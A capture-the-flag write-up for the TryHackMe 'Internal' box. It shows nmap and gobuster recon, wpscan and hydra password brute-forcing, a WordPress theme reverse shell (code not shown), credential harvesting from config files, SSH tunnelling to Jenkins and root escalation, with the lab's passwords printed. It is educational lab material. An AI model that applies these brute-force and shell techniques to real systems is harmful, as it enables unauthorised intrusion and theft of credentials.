# Recon
```
sudo nmap -sV -p- -Pn -oN nmap.txt -O 10.10.23.154
```
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Internal/assets/1.png">

We run gobuster to discover directories:
```
gobuster dir -u http://10.10.23.154 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
```
/blog                 (Status: 301) [Size: 313] [--> http://10.10.23.154/blog/]
/wordpress            (Status: 301) [Size: 318] [--> http://10.10.23.154/wordpress/]
/javascript           (Status: 301) [Size: 319] [--> http://10.10.23.154/javascript/]
/phpmyadmin           (Status: 301) [Size: 319] [--> http://10.10.23.154/phpmyadmin/]
/server-status        (Status: 403) [Size: 278]   
```

After browsing to http://10.10.23.154/wordpress we find a link to internal.thm.
We add internal.htm to our /etc/hosts so we can see the actual blog.

# Enumeration
We use wpscan to do some enumeration on the CMS.
```
wpscan --url http://internal.thm/blog/ -et -ep -eu
```

We found a user: admin and version 5.4.2, which is not vulnerable.
The theme is out of date. Version 2.3 but current version is 2.8
```
wpscan --url internal.thm/wordpress/ --passwords rockyou.txt --usernames admin --max-threads 50
```
```

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys
 ```

After login in the Wordpress page we found a post with:
```
william:arnold147
```

I tried using SSH to connect with these credentials but without any luck.

# Initial Foothold
I know you can use themes pages to create a php reverse shell. I changed 404.php and loaded it by browsing to:
```
http://internal.thm/wordpress/wp-content/themes/twentyseventeen/404.php
```

We got a shell withc user www-data.

We found a config file in /etc/phpmyadmin
```
$dbuser='phpmyadmin';
$dbpass='B2Ud4fEOZmVq';
$basepath='';
$dbname='phpmyadmin';
$dbserver='localhost';
$dbport='3306';
$dbtype='mysql';
```

And also credentials in /opt/wp-save.txt
```
aubreanna:bubb13guM!@#123
```

We can SSH with aubreanna and got our user flag.
We also find a file called jenkins which tells us that:
```
Internal Jenkins service is running on 172.17.0.2:8080
```

There are no cronjobs running and sudo -l isn't possible.
I tried using ssh tunneling to gain access to the Jenkins service.
```
ssh -L 4445:localhost:8080 aubreanna@10.10.23.154
```

Let's use hydra to bruteforce the login:
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 4445 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
```
```
[4445][http-post-form] host: localhost   login: admin   password: spongebob
We found a password
```


We go to Manage > Tools and Actions > Script Console
Run reverse shell from
https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6
. Change cmd.exe to bash for linux.

Found file in /opt/ with root pass
```
root:tr0ub13guM!@#123
```

Change user on SSH session with user aubreanna:
```
su root 
```
Got root flag.



